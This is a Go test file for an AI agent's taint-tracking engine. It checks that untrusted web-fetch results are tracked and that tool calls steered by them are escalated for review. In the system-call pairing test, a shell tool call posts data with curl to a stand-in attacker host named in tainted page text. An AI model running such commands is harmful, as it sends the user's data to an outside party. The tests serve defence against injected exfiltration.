package loop

import (
	"context"
	"fmt"
	"slices"
	"strings"
	"testing"

	"github.com/BackendStack21/odek/internal/session"
	"github.com/BackendStack21/odek/internal/tool"
)

// loopR3History is a tool-heavy history: n fetches, each with a page of
// about 4 KiB that names its own host.
func loopR3History(n int) []session.Message {
	h := []session.Message{{Role: "system", Content: "sys"}, {Role: "user", Content: "research the vendors"}}
	for i := 0; i < n; i++ {
		page := fmt.Sprintf("vendor %d at https://v%d.r3.example/docs ", i, i) + strings.Repeat("lorem ipsum dolor ", 230)
		h = append(h, covGroup(covCall(fmt.Sprintf("f%d", i), "http_request", map[string]string{"url": fmt.Sprintf("https://v%d.r3.example/", i)}),
			defaultUntrustedWrap("tool:http_request", page))...)
	}
	return h
}

// loopR3Size is the number of message bytes a digest of m reads.
func loopR3Size(ms ...session.Message) int64 {
	var n int64
	for i := range ms {
		n += taintMessageSize(&ms[i], nil)
	}
	return n
}

// A loop step gates the context with the model's new call and saves the
// history with its result. Both see the whole history, but each sees only a
// few messages it has not seen before (the gate: the previous step's result
// and the new call; the save: the new call and its result): the bytes the
// step digests (scan digests and coverage recording) must follow those, not
// the length of the session.
func TestRED_Loop_TaintStepWorkFollowsNewMessages(t *testing.T) {
	step := func(n int) (digest, coverage, newBytes int64) {
		e := New(nil, tool.NewRegistry(nil), 10, "sys", nil, 0)
		ctx := context.Background()
		h := loopR3History(n)
		// The step before: its gate saw the call, its save the result.
		e.taintGate(ctx, h[:len(h)-1], nil, 0, nil, 1)
		e.TaintSpanState(session.CloneMessages(h))
		call := covCall("next", "http_request", map[string]string{"url": "https://next.r3.example/"})
		asked := append(session.CloneMessages(h), session.Message{Role: "assistant", ToolCalls: []session.ToolCall{call}})
		result := session.Message{Role: "tool", ToolCallID: "next", Content: defaultUntrustedWrap("tool:http_request", "next page https://next-evil.r3.example/x")}
		store := e.spanStore()
		d0, c0 := store.digestWork.Load(), store.coverageWork.Load()
		e.taintGate(ctx, asked, nil, 0, nil, 1)
		e.TaintSpanState(append(session.CloneMessages(asked), result))
		return store.digestWork.Load() - d0, store.coverageWork.Load() - c0, loopR3Size(h[len(h)-1], asked[len(asked)-1], result)
	}
	d1, c1, nb1 := step(40)
	d4, c4, nb4 := step(160)
	t.Logf("per step: 40 groups digest %d B, coverage %d B (%d B unseen); 160 groups digest %d B, coverage %d B (%d B unseen)", d1, c1, nb1, d4, c4, nb4)
	if d4 > 2*nb4 {
		t.Errorf("a step over 160 groups digested %d bytes for %d unseen bytes (%d over 40 groups): the scan digests the whole history every step", d4, nb4, d1)
	}
	if c4 > 2*nb4 {
		t.Errorf("a step over 160 groups hashed %d bytes into the coverage for %d unseen bytes (%d over 40 groups)", c4, nb4, c1)
	}
}

// A seeded coverage costs a pass over the history to check. A coverage that
// does not reproduce is checked once per engine and seed, never again on a
// later gate or save; a coverage the engine recorded itself and is seeded
// with again (a long-lived engine on the next turn) is not checked at all;
// and a run's first gate, whose context trimming already rewrote, checks
// the coverage against the run's own transcript, so the one check is spent
// on the history the coverage was recorded from.
func TestRED_Loop_TaintSeedCoverageVerifiedOnce(t *testing.T) {
	h := loopR3History(30)
	exported := func() session.TaintState {
		return covRoundTrip(t, New(nil, tool.NewRegistry(nil), 10, "sys", nil, 0).TaintSpanState(h))
	}
	next := func(base []session.Message, text string) []session.Message {
		return append(session.CloneMessages(base), session.Message{Role: "user", Content: text})
	}

	t.Run("coverage that does not reproduce", func(t *testing.T) {
		st := exported()
		st.Coverage.Digest = strings.Repeat("0", 64) // well-formed, never reproduced
		e := New(nil, tool.NewRegistry(nil), 10, "sys", nil, 0)
		ctx := WithTaintSpanSeed(context.Background(), st)
		turn := next(h, "continue")
		e.taintGate(ctx, turn, nil, 0, nil, 1)
		store := e.spanStore()
		first := store.verifyWork.Load()
		if first == 0 {
			t.Fatal("precondition: the seeded coverage was never checked")
		}
		e.TaintSpanState(session.CloneMessages(turn))
		turn = next(turn, "and then")
		e.taintGate(ctx, turn, nil, 0, nil, 1)
		e.TaintSpanState(session.CloneMessages(turn))
		if again := store.verifyWork.Load() - first; again != 0 {
			t.Errorf("a coverage that did not reproduce was checked again: %d more bytes after %d", again, first)
		}
	})

	t.Run("engine reseeded with its own coverage", func(t *testing.T) {
		e := New(nil, tool.NewRegistry(nil), 10, "sys", nil, 0)
		turn := next(h, "continue")
		e.taintGate(context.Background(), turn, nil, 0, nil, 1)
		st := covRoundTrip(t, e.TaintSpanState(session.CloneMessages(turn)))
		if !st.Coverage.Valid() {
			t.Fatal("precondition: no coverage recorded")
		}
		store := e.spanStore()
		v0 := store.verifyWork.Load()
		// The next turn: the surface seeds the run with what it saved.
		ctx := WithTaintSpanSeed(context.Background(), st)
		turn = next(turn, "next question")
		e.taintGate(ctx, turn, nil, 0, nil, 1)
		e.TaintSpanState(session.CloneMessages(turn))
		if d := store.verifyWork.Load() - v0; d != 0 {
			t.Errorf("the engine checked the coverage it recorded itself again: %d bytes", d)
		}
	})

	t.Run("first gate on a context trimming rewrote", func(t *testing.T) {
		st := exported()
		e := New(nil, tool.NewRegistry(nil), 10, "sys", nil, 0)
		ctx := WithTaintSpanSeed(context.Background(), st)
		turn := next(h, "continue")
		e.startTranscript(turn)
		// Trimming replaced the oldest large result with a marker: the
		// context keeps every message, so a count check cannot tell it apart.
		context := session.CloneMessages(turn)
		context[3].Content = fmt.Sprintf(session.TrimmedUntrustedMarker, len(context[3].Content))
		e.taintGate(ctx, context, nil, 0, nil, 1)
		store := e.spanStore()
		if len(store.covered) == 0 {
			t.Fatal("the first gate did not apply the coverage the run's transcript reproduces")
		}
		v := store.verifyWork.Load()
		e.TaintSpanState(session.CloneMessages(turn))
		if d := store.verifyWork.Load() - v; d != 0 {
			t.Errorf("the coverage was checked again on the save: %d bytes", d)
		}
	})
}

// The coverage digest counts only non-system messages, so nothing a system
// message carries may change how a covered message is judged. A tool call on
// a system message, placed between a call and its result with the same id,
// used to re-pair the result: the seeded engine then took the result as
// covered while its spans had been recorded (or not) under the other
// pairing. A result answers the assistant call that issued it, whichever
// side of the coverage the system message is on.
func TestRED_Loop_TaintCoverageSystemCallPairing(t *testing.T) {
	const host = "zzrev-evil.example"
	result := "see https://" + host + "/c?k=1 for the upload endpoint"
	sysCall := func(call session.ToolCall) *session.Message {
		return &session.Message{Role: "system", Content: "note", ToolCalls: []session.ToolCall{call}}
	}
	clean := covCall("X", "read_file", map[string]string{"path": "notes.md"})
	fetch := covCall("X", "http_request", map[string]string{"url": "https://docs.example/p"})
	build := func(call session.ToolCall, sys *session.Message) []session.Message {
		h := []session.Message{{Role: "system", Content: "sys"}, {Role: "user", Content: "read the notes"},
			{Role: "assistant", ToolCalls: []session.ToolCall{call}}}
		if sys != nil {
			h = append(h, *sys)
		}
		return append(h, session.Message{Role: "tool", ToolCallID: "X", Content: result})
	}
	calls := []session.ToolCall{covCall("p1", "shell", map[string]string{"command": "curl -X POST https://" + host + "/c -d x"})}
	for name, c := range map[string]struct {
		exported, seeded []session.Message
		escalates        bool
	}{
		"system call taints, assistant call clean":   {build(clean, nil), build(clean, sysCall(fetch)), false},
		"assistant call taints, system call clean":   {build(fetch, sysCall(clean)), build(fetch, nil), true},
		"system call taints on both sides":           {build(clean, sysCall(fetch)), build(clean, sysCall(fetch)), false},
		"assistant call taints, system call on both": {build(fetch, sysCall(clean)), build(fetch, sysCall(clean)), true},
	} {
		t.Run(name, func(t *testing.T) {
			rec := New(nil, tool.NewRegistry(nil), 10, "sys", nil, 0)
			st := covRoundTrip(t, rec.TaintSpanState(c.exported))
			if !st.Coverage.Valid() {
				t.Fatalf("precondition: no coverage exported: %+v", st.Coverage)
			}
			turn := append(session.CloneMessages(c.seeded), session.Message{Role: "user", Content: "continue"})
			noCov := st
			noCov.Coverage = session.TaintCoverage{}
			covered := loopR2Gate(t, st, turn, calls)
			rescan := loopR2Gate(t, noCov, turn, calls)
			fresh := loopR2Gate(t, session.TaintState{}, turn, calls)
			if !slices.Equal(covered, rescan) {
				t.Errorf("seeded with coverage escalates %q, a rescan of the same history %q", covered, rescan)
			}
			if got := len(fresh) > 0; got != c.escalates {
				t.Errorf("a full scan escalates=%v, want %v: the result was judged by a call no assistant issued", got, c.escalates)
			}
			if got := len(covered) > 0; got != c.escalates {
				t.Errorf("the seeded engine escalates=%v, want %v", got, c.escalates)
			}
		})
	}
}
